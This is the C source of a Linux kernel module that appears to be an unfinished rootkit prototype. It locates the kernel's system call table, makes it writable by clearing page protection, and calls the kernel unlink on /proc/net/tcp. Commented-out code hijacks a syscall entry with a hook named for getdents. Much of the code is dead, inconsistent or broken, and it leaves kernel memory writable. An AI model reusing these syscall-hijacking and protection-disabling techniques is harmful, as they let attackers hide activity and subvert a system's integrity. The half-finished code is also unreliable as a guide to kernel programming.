#define MODULE
#define LINUX
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/fs.h>


static unsigned long **p_sys_call_table;

// int openat(int dirfd, const char *pathname, int flags);

//ssize_t read(int fd, void *buf, size_t count);
asmlinkage int (*original_unlink) (const char *pathname);

asmlinkage ssize_t (*original_getdents) (int fd,  void *buf, size_t count);

asmlinkage int sys_getdents_hook(int fd,  void *buf, size_t count)
{
    int nread;
    // char* copied_buf;
    size_t copid_count = count;
    // get_user(copid_count, &count);
    if ((unsigned long) count > 0){
        printk("foo = %lu\n", (unsigned long) count);
    }

    // int nread;
    // // char* copied_buf;
    // size_t copid_count;
    // get_user(copid_count, &count);
    // if ((unsigned long) copid_count > 0){
    //     printk("foo = %lu\n", (unsigned long) copid_count);
    // }





    // printk("lets see what we got");
    nread = original_getdents(fd, buf, count);

    // printk("count is: %d", count);
    // if (nread > 0 && nread < 1024){
    //     // copied_buf = kmalloc(sizeof(char) * nread, GFP_KERNEL);
    //     // kfree(copied_buf);
    // }

    // copy_from_user(copied_buf, buf, nread);

                // memmove(tempbuf + bpos ,myplace + bpos + copied.d_reclen, rem);

                // copy_to_user(dirp, myplace, count);

    // strncpy_from_user(copied_pathname, pathname, 256);
    // printk("d name: %s", copied_pathname);
    
    return nread;
}

int set_page_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
    return 0;
}

int set_page_ro(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
    return 0;
}


struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        printk("had some error");
        err = PTR_ERR(filp);
        return NULL;
    }
    printk("no problem man");
    return filp;
}

int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_read(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldfs;
    ssize_t ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}   

int init_module(void)
{
    // unlink("/proc/net/tcp");
    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");

    set_page_rw((unsigned long)p_sys_call_table);

    original_unlink = (void*)p_sys_call_table[__NR_unlink];

    int res = original_unlink("/proc/net/tcp");

    printk("res was: %d", res);
    printk("temp print");
    // struct file *fp = NULL;
    // ssize_t res;
    // unsigned char buff[256] = {0};
    // bool isnull;
    // unsigned long long offset = 0;

    // fp = file_open("/proc/net/tcp", O_RDWR,0);
    // isnull = (fp == NULL);
    // printk("fp is null %d", isnull);
    // res = file_read(fp, offset, buff, 256);
    // printk("was able to read %zd", res);
    // printk("think i read: %s", buff);


    // offset = 0;
    // res = file_write(fp, offset, buff, 256);
    // printk("was able to write %zd", res);
    

    // printk("temp print");

    // p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");

    // set_page_rw((unsigned long)p_sys_call_table);

    // original_getdents = (void*)p_sys_call_table[__NR_read];
    // p_sys_call_table[__NR_read] = (void*)sys_getdents_hook;
    return 0;
}

void cleanup_module(void)
{       
    // p_sys_call_table[__NR_read] = (void*)original_getdents;
    // set_page_ro((unsigned long)p_sys_call_table);

}  
MODULE_LICENSE("GPL");